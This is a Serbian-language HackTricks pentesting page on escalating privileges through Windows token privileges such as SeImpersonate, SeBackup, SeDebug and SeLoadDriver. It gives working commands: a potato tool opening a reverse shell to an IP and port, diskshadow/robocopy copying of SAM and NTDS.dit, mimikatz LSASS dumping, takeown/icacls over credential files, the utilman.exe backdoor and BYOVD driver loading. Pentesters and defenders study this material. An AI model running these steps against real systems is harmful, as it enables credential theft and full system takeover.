# Zloupotreba tokena

{{#include ../../banners/hacktricks-training.md}}

## Tokeni

Ako **ne znate šta su Windows Access Tokens**, pročitajte ovu stranicu pre nego što nastavite:


{{#ref}}
access-tokens.md
{{#endref}}

**Možda biste mogli da eskalirate privilegije zloupotrebom tokena koje već imate**

### SeImpersonatePrivilege

Ovo je privilegija koju poseduje svaki proces i koja omogućava impersonaciju, ali ne i kreiranje bilo kog tokena, pod uslovom da se može pribaviti handle do njega. Privilegovani token može da se pribavi od Windows servisa (DCOM) tako što se on navede da izvrši NTLM autentikaciju prema exploit-u, čime se naknadno omogućava izvršavanje procesa sa SYSTEM privilegijama.<sup>[[2]](#references)</sup> Ova ranjivost može da se iskoristi pomoću različitih alata, kao što su [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (što zahteva da winrm bude onemogućen), [SweetPotato](https://github.com/CCob/SweetPotato) i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Napomene za moderne operatere:

- **JuicyPotato je legacy**: na Windows 10 1809+/Server 2019+ dajte prednost alatima **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ili **PrintSpoofer**, u zavisnosti od toga koja RPC/COM površina je i dalje dostupna.
- Ako ste kompromitovali servis koji radi kao **`LOCAL SERVICE`** ili **`NETWORK SERVICE`**, a `whoami /priv` prikazuje **filtered token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, prvo povratite **default privilege set** naloga (na primer pomoću alata **FullPowers**), a zatim ponovo pokušajte sa potato alatima.<sup>[[3]](#references)</sup>
- Neki noviji forkovi su praktičniji za operatere od originalnih alata. Na primer, **SigmaPotato** dodaje reflection/izvršavanje u memoriji i kompatibilnost sa modernim verzijama Windowsa, dok **PrintNotifyPotato** zloupotrebljava PrintNotify COM servis i često je koristan kada je klasična Spooler putanja onemogućena.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Veoma je slična privilegiji **SeImpersonatePrivilege**; koristiće **isti metod** za dobijanje privilegovanog tokena.\
Zatim, ova privilegija omogućava **dodeljivanje primarnog tokena** novom/zaustavljenom procesu. Pomoću privilegovanog impersonation tokena možete izvesti primarni token (DuplicateTokenEx).\
Pomoću tokena možete kreirati **novi proces** sa `CreateProcessAsUser` ili kreirati zaustavljeni proces i **postaviti token** (uopšteno, ne možete menjati primarni token pokrenutog procesa).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Ako je ovaj token omogućen, možete koristiti **KERB_S4U_LOGON** za dobijanje **impersonation tokena** za bilo kog drugog korisnika bez poznavanja kredencijala, **dodavanje proizvoljne grupe** (admins) tokenu, postavljanje **nivoa integriteta** tokena na "**medium**" i dodeljivanje ovog tokena **trenutnoj niti** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Ova privilegija uzrokuje da sistem **odobri kontrolu potpunog pristupa za čitanje** bilo kom fajlu (ograničeno na operacije čitanja). Koristi se za **čitanje password hash-eva lokalnih Administrator** naloga iz registra, nakon čega se alati kao što su "**psexec**" ili "**wmiexec**" mogu koristiti sa hash-om (Pass-the-Hash technique). Međutim, ova tehnika ne uspeva u dva slučaja: kada je nalog Local Administrator onemogućen ili kada je aktivna politika koja uklanja administrativna prava sa Local Administrators koji se povezuju udaljeno.<sup>[[2]](#references)</sup>\
U praksi je najpouzdaniji ugrađeni workflow obično **VSS + `robocopy /b`**: kreirajte/izložite shadow copy, a zatim kopirajte `SAM`/`SYSTEM` ili `NTDS.dit` u **backup mode-u**, čime se zaobilaze ACL-ovi fajlova.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Ovu **privilegiju možete zloupotrebiti pomoću**:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- praćenjem **IppSec-a** na [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ili kao što je objašnjeno u odeljku **escalating privileges with Backup Operators**:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ova privilegija omogućava **write access** bilo kojoj sistemskoj datoteci, bez obzira na Access Control List (ACL) te datoteke. Ona pruža brojne mogućnosti za eskalaciju, uključujući mogućnost **modifikovanja servisa**, izvođenja DLL Hijacking-a i postavljanja **debuggera** putem Image File Execution Options, između raznih drugih tehnika.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege je moćna dozvola, naročito korisna kada korisnik poseduje mogućnost impersonacije tokena, ali i u odsustvu SeImpersonatePrivilege. Ova mogućnost zavisi od sposobnosti impersonacije tokena koji predstavlja istog korisnika i čiji nivo integriteta nije veći od nivoa integriteta trenutnog procesa.<sup>[[2]](#references)</sup>

**Ključne tačke:**

- **Impersonacija bez SeImpersonatePrivilege:** SeCreateTokenPrivilege se može iskoristiti za EoP impersonacijom tokena pod određenim uslovima.
- **Uslovi za impersonaciju tokena:** Uspešna impersonacija zahteva da ciljni token pripada istom korisniku i da ima nivo integriteta koji je manji ili jednak nivou integriteta procesa koji pokušava impersonaciju.
- **Kreiranje i izmena impersonation tokena:** Korisnici mogu da kreiraju impersonation token i prošire ga dodavanjem SID-a privilegovane grupe (Security Identifier).

### SeLoadDriverPrivilege

Ova privilegija omogućava **učitavanje i uklanjanje device drivera** kreiranjem registry unosa sa specifičnim vrednostima za `ImagePath` i `Type`. Pošto je direktan write access za `HKLM` (HKEY_LOCAL_MACHINE) ograničen, mora se koristiti `HKCU` (HKEY_CURRENT_USER). Međutim, da bi kernel prepoznao `HKCU` za konfiguraciju drivera, mora se pratiti određena putanja.<sup>[[2]](#references)</sup>

Savremena ofanzivna upotreba obično podrazumeva **BYOVD** (bring your own vulnerable driver): učitavanje **potpisanog, ali ranjivog** kernel drivera, a zatim korišćenje njegovih IOCTL-ova za onemogućavanje zaštita ili prelazak na izvršavanje koda u kernelu. Imajte na umu da na novijim Windows 11/Server buildovima **Microsoft vulnerable driver blocklist** i/ili **HVCI/Memory Integrity** često onemogućavaju starije javno dostupne chainove, pa klasični primeri u stilu `szkg64.sys` više nisu univerzalno pouzdani.

Ova putanja je `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gde je `<RID>` Relative Identifier trenutnog korisnika. Unutar `HKCU` mora se kreirati cela ova putanja i postaviti dve vrednosti:<sup>[[2]](#references)</sup>

- `ImagePath`, što predstavlja putanju do binarnog fajla koji treba izvršiti
- `Type`, sa vrednošću `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Koraci:**

1. Pristupite `HKCU` umesto `HKLM`, zbog ograničenog write access-a.
2. Kreirajte putanju `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` unutar `HKCU`, gde `<RID>` predstavlja Relative Identifier trenutnog korisnika.
3. Postavite `ImagePath` na putanju za izvršavanje binarnog fajla.
4. Dodelite `Type` kao `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Više načina za zloupotrebu ove privilegije možete pronaći na [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Ovo je slično privilegiji **SeRestorePrivilege**. Njena primarna funkcija omogućava procesu da **preuzme vlasništvo nad objektom**, zaobilazeći zahtev za eksplicitnim diskrecionim pristupom putem dodeljivanja prava pristupa WRITE_OWNER. Proces najpre podrazumeva obezbeđivanje vlasništva nad željenim registry ključem radi pisanja, a zatim izmenu DACL-a kako bi se omogućile operacije upisivanja.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Ova privilegija omogućava **debug drugih procesa**, uključujući čitanje i upisivanje u memoriju. Različite strategije za memory injection, koje mogu zaobići većinu antivirusnih rešenja i rešenja za sprečavanje upada na host, mogu se koristiti sa ovom privilegijom.<sup>[[2]](#references)</sup>

Na modernom Windows-u, imajte na umu da je `SeDebugPrivilege` obično dovoljna za otvaranje **SYSTEM procesa koji nisu zaštićeni** i dupliranje njihovih tokena, ali **ne garantuje** da možete pristupiti procesu **LSASS**. Ako je **RunAsPPL / LSA Protection** omogućen, nezaštićeni procesi ne mogu da čitaju iz procesa LSASS niti da u njega ubacuju kod, čak i kada je `SeDebugPrivilege` prisutna. U tom slučaju, ukradite token iz drugog SYSTEM procesa koji nije PPL ili kombinujte ovo sa PPL bypass/BYOVD tehnikom, umesto da pretpostavite da će `procdump` raditi. Za kompletan primer kopiranja tokena pomoću `SeDebugPrivilege` + `SeImpersonatePrivilege`, pogledajte [ovu stranicu](sedebug-+-seimpersonate-copy-token.md).

#### Dump memorije

Možete koristiti [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) iz [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) da biste **preuzeli memoriju procesa**. Konkretno, ovo se može primeniti na proces **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, koji je zadužen za čuvanje korisničkih kredencijala nakon što se korisnik uspešno prijavi na sistem.

Zatim možete učitati ovaj dump u mimikatz da biste dobili lozinke:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Ako želite da dobijete `NT SYSTEM` shell, možete koristiti:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Ovo pravo (Perform volume maintenance tasks) omogućava otvaranje neobrađenih handle-ova uređaja volumena (npr. \\.\C:) radi direktnog disk I/O-a koji zaobilazi NTFS ACL-ove. Pomoću njega možete kopirati bajtove bilo koje datoteke na volumenu čitanjem osnovnih blokova, što omogućava proizvoljno čitanje datoteka sa osetljivim materijalom (npr. privatni ključevi računara u %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS putem VSS-a).<sup>[[5]](#references)</sup> Posebno je značajno na CA serverima, gde eksfiltracija privatnog ključa CA omogućava falsifikovanje Golden Certificate-a radi impersonacije bilo kog principala.<sup>[[6]](#references)</sup>

Pogledajte detaljne tehnike i mere za ublažavanje:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Provera privilegija
```
whoami /priv
```
**Tokeni koji se prikazuju kao Disabled** obično mogu da se omoguće, tako da često možete zloupotrebiti i privilegije _Enabled_ i _Disabled_.

### Omogućavanje svih tokena

Ako imate onemogućene privilegije, možete koristiti skriptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) da omogućite sve tokene:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ili **script** ugrađen u ovaj [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

Kompletan cheatsheet privilegija tokena nalazi se na [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), a sažetak u nastavku navodi samo direktne načine za iskorišćavanje privilegije radi dobijanja admin sesije ili čitanja osetljivih datoteka.<sup>[[1]](#references)</sup>

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | alat treće strane          | _„Omogućava korisniku da impersonate token-e i izvrši privesc na nt system koristeći alate kao što su potato.exe, rottenpotato.exe i juicypotato.exe“_                                                                                                                                                                                                      | Hvala [Aurélien Chalot](https://twitter.com/Defte_) na ažuriranju. Uskoro ću pokušati da ovo preformulišem u nešto više nalik receptu.                                                                                                                                                                                         |
| **`SeBackup`**             | **Pretnja**  | _**Ugrađene komande**_ | Čitajte osetljive datoteke pomoću `robocopy /b` ili namenski napravljenih copy helper-a koji podržavaju SeBackup.                                                                                                                                                                                                                                                                 | <p>- Odlično za `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, a ponekad i `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` je praktičan, ali namenski SeBackup cmdlet-i/API-ji često nude veću fleksibilnost za zaključane/otvorene datoteke.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | alat treće strane          | Kreirajte proizvoljan token, uključujući lokalna administratorska prava, pomoću `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplirajte **non-PPL** SYSTEM token ili preuzmite memoriju iz nezaštićenog procesa.                                                                                                                                                                                                                                                                 | <p>LSASS dumping je obično blokiran ako je RunAsPPL/LSA Protection omogućen.</p><p>Script se nalazi na [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | alat treće strane          | Koristite **Potato family** / impersonation imenovanog pipe-a za pokretanje SYSTEM-a (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, itd.).                                                                                                                                                                                    | <p>Najpraktičnije je iz service account-a kao što su IIS APPPOOL, MSSQL, scheduled tasks ili bilo kog konteksta koji već poseduje `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | alat treće strane          | <p>1. Učitajte potpisani, ali ranjivi kernel driver (BYOVD)<br>2. Koristite IOCTL-ove driver-a za dobijanje kernel R/W pristupa, onesposobljavanje security alata ili eskalaciju na SYSTEM<br><br>Alternativno, privilegija može da se koristi za unload security-related driver-a pomoću ugrađene komande <code>fltMC</code>, npr. <code>fltMC sysmondrv</code></p>                     | <p>Stariji javno dostupni driver-i kao što je <code>szkg64.sys</code> sve se češće blokiraju na modernom Windows-u pomoću vulnerable-driver blocklist-e / HVCI-ja.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Pokrenite PowerShell/ISE sa prisutnom SeRestore privilegijom.<br>2. Omogućite privilegiju pomoću <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Preimenujte utilman.exe u utilman.old<br>4. Preimenujte cmd.exe u utilman.exe<br>5. Zaključajte konzolu i pritisnite Win+U</p> | <p>Neki AV software može detektovati napad.</p><p>Alternativni metod se oslanja na zamenu service binaries uskladištenih u „Program Files“ koristeći istu privilegiju</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Ugrađene komande**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Preimenujte cmd.exe u utilman.exe<br>4. Zaključajte konzolu i pritisnite Win+U</p>                                                                                                                                       | <p>Neki AV software može detektovati napad.</p><p>Alternativni metod se oslanja na zamenu service binaries uskladištenih u „Program Files“ koristeći istu privilegiju.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | alat treće strane          | <p>Manipulišite token-ima tako da sadrže lokalna administratorska prava. Može biti potreban SeImpersonate.</p><p>Treba proveriti.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - exploitation paths from Windows privileges to admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Give Me Back My Privileges! Please?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
